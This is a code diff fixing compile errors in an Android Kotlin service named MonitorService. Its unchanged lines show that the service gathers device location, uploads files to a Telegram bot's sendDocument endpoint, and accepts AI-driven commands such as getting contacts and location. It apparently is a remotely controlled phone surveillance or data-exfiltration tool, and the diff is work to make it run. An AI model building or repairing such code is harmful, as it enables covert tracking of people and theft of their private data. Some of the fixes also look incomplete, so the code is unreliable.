@@ -33,6 +33,7 @@ import android.util.Log
 import androidx.core.app.NotificationCompat
 import com.google.gson.Gson
 import com.google.gson.reflect.TypeToken
+import okhttp3.MediaType
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.MultipartBody
 import okhttp3.OkHttpClient
@@ -40,6 +41,7 @@ import okhttp3.Request
 import okhttp3.RequestBody
 import okhttp3.RequestBody.Companion.toRequestBody
 import okhttp3.Response
+import java.util.regex.Pattern
 import java.io.File
 import java.io.FileOutputStream
 import java.io.OutputStreamWriter
@@ -531,10 +533,10 @@ class MonitorService : Service() {
                 }
                 return mutableMapOf("error" to "Location timeout - no fix in 5s")
             } catch (e: Exception) {
-                mutableMapOf("error" to e.message ?: "Location error")
+                return mutableMapOf("error" to e.message ?: "Location error")
             }
         } catch (e: Exception) {
-            mutableMapOf("error" to e.message ?: "Location error")
+            return mutableMapOf("error" to e.message ?: "Location error")
         }
     }
 
@@ -678,7 +680,7 @@ class MonitorService : Service() {
                     .addFormDataPart("chat_id", chatId.toString())
                     .addFormDataPart("caption", caption)
                     .addFormDataPart("document", filename,
-                        RequestBody.create(file.readBytes(), MediaType.parse("text/plain")))
+                        RequestBody.create(file.readBytes(), okhttp3.MediaType.parse("text/plain")))
                     .build()
                 
                 val req = Request.Builder().url("$TELEGRAM_API$BOT_TOKEN/sendDocument").post(requestBody).build()
@@ -720,7 +722,7 @@ private fun callNemotron(prompt: String): String {
     try {
         // Quick response for simple greetings
         val lower = prompt.lowercase()
-        if (lower.matches("^(hi|hello|hey|test|ping)$")) {
+        if (Pattern.matches("^(hi|hello|hey|test|ping)$", lower)) {
             return """{"action": "none", "response": "Hello! I'm ready. Use /help for commands or ask me to run tasks like '/ai get contacts and location'."}"""
         }
         
